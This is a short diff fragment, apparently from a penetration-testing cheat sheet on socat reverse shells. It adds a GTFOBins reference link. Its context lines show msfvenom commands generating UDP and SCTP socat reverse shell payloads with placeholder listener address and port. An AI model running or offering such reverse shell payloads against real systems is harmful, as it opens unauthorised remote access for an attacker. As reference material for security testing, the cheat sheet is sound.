@@ -29,3 +29,8 @@ $ msfvenom -p cmd/unix/reverse_socat_udp lhost=<IP> lport=<PORT>
 ```
 $ msfvenom -p cmd/unix/reverse_socat_sctp lhost=<IP> lport=<PORT>
 ```
+
+---
+## References
+
+- [GTFOBins: Socat](https://gtfobins.github.io/gtfobins/socat/)
